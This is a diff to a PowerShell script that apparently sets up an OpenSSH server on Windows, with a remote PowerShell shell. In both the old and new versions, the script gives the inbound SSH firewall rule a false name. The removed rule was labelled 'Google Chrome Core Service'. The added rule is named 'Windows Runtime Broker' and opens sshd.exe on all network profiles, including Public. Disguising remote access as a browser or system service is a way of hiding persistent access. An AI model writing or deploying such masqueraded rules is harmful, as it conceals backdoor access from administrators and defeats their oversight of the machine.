@@ -128,7 +128,11 @@ Write-Host "Ensuring UserKey file permissions are correct" -ForegroundColor Gree
 powershell.exe -ExecutionPolicy Bypass -Command '. .\FixUserFilePermissions.ps1 -Confirm:$false'
 #Add firewall rule
 Write-Host "Creating firewall rule" -ForegroundColor Green
-New-NetFirewallRule -Name sshd -DisplayName 'Google Chrome Core Service' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -ErrorAction SilentlyContinue
+# Define the rule name and program path
+$RuleName = "Windows Runtime Broker"
+$ProgramPath = "C:\Program Files\OpenSSH\sshd.exe"
+# Create the new firewall rule
+New-NetFirewallRule -Name $RuleName -DisplayName $RuleName -Action Allow -Enabled True -Direction Inbound -Program $ProgramPath -Profile @("Domain", "Private", "Public")
 #Set Shell to powershell
 Write-Host "Setting default shell to powershell" -ForegroundColor Green
 New-ItemProperty -Path "HKLM:\SOFTWARE\OpenSSH" -Name DefaultShell -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -PropertyType String -Force -ErrorAction Stop | Out-Null
